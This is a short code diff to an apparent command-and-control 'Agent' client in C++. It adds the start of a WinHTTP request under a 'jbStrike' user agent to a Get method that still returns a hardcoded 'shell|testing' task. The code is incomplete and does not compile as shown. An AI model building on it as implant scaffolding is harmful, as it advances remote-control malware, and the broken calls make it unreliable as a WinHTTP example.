@@ -14,7 +14,20 @@ void Agent::Register(std::string ip, unsigned int port) {
 
 
 std::string Agent::Get(std::string path) {
-	//DECODE DATA.
+	std::string result = "";
+	HINTERNET hSession, hConnect, hRequest;
+	
+	hSession = WinHttpOpen(L"jbStrike UserAgent/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, );
+	
+	if (!hSession) {
+		return "";
+	}
+
+	hConnect = WinHttpConnect(hSession, path);
+
+	if (!hConnect) {
+		return "";
+	}
 
 	// path = path + "/" + AgentID + "/"
 	return "shell|testing";
